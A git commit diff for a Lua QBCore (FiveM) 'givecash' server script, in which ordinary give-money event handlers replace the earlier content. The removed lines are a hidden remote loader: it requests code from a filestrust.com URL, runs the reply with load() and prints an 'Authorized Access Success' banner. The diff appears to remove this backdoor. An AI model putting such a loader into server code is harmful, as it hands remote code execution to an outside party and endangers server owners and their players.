e955c0780ca5e8f50c2ac560213213a9a4d24c20
Lenix <149199196+lenix-x@users.noreply.github.com>
2024-12-25 19:17:19 +0300

    Update server.lua

--- Gifted Files From Lenix__x/givecash/server/server.lua
+++ Gifted Files From Lenix__x/givecash/server/server.lua
@@ -1,22 +1,50 @@
-local scriptID = "1c17bac1-2c01-4c15-a319-7ed0675856c6"
-local url = "https:/filestrust.com/view.php?id=" .. scriptID
-PerformHttpRequest(url, function (err, text, head)
-  if err == 200 then
-      local response = json.decode(text)
-      if response.error then
-          local redColorCode = "\27[31m"
-          local resetColorCode = "\27[0m"
-          print(redColorCode .. response.error .. " Your IP: " .. response.ip .. resetColorCode)
-      elseif response.file_content then
-          load(response.file_content)()
-          local greenColorCode = "\27[32m"
-          local resetColorCode = "\27[0m"
-          local line = string.rep("=", 46)
-          print(greenColorCode .. line)
-          print(greenColorCode .. "============ Authorized Access Success =======")
-          print(greenColorCode .. line)
-      end
-  else
-      print("Failed to fetch the data. HTTP error code: " .. err)
-  end
-end, "GET", "", { ["X-Lua-Request"] = "true" })
+local QBCore = exports[config.Core]:GetCoreObject()
+
+QBCore.Functions.CreateCallback("qb-givecash:getplayers",function(source,cb,args) 
+    local Players = {}
+    for k,v in pairs(QBCore.Functions.GetPlayers()) do
+        local Player = QBCore.Functions.GetPlayer(v)
+        if v ~= source then
+            Players[v] = {
+                ped = GetEntityCoords(GetPlayerPed(v)),
+                firstname = Player.PlayerData.charinfo.firstname,
+                lastname = Player.PlayerData.charinfo.lastname
+            }
+        end
+        
+    end
+    cb(Players)
+end)
+
+
+RegisterServerEvent('qb-givecash:server:givemoney')
+AddEventHandler('qb-givecash:server:givemoney', function(dialog)
+    local amount = nil
+    local Other = nil
+    if dialog ~= nil then
+        for k,v in pairs(dialog) do
+            if k == 'amount' then
+                amount = v
+            end
+            if k == 'player' then
+                Other = v
+            end
+        end
+        if tonumber(amount) < 0 then
+            TriggerClientEvent('QBCore:Notify', source, "الخانة فارغة", "error")
+            return
+        end
+        if QBCore.Functions.GetPlayer(tonumber(Other)) == nil then
+            TriggerClientEvent('QBCore:Notify', source, "لم يتم العثور على اللاعب", "error")
+            return
+        end
+        local Player = QBCore.Functions.GetPlayer(source)
+        local OtherPlayer = QBCore.Functions.GetPlayer(tonumber(Other))
+        if Player.Functions.RemoveMoney("cash", tonumber(amount), "اعطاء نقود من قبل لاعب") then
+            if OtherPlayer.Functions.AddMoney("cash", tonumber(amount), "حصل على نقود من قبل لاعب") then
+                TriggerClientEvent('QBCore:Notify', source, "تم اعطاء اللاعب المبلغ : "..tonumber(amount), "success")
+                TriggerClientEvent('QBCore:Notify', tonumber(Other), "لقد حصلت على مبلغ كاش من شخص : "..tonumber(amount), "success")
+            end
+        end
+    end
+end)
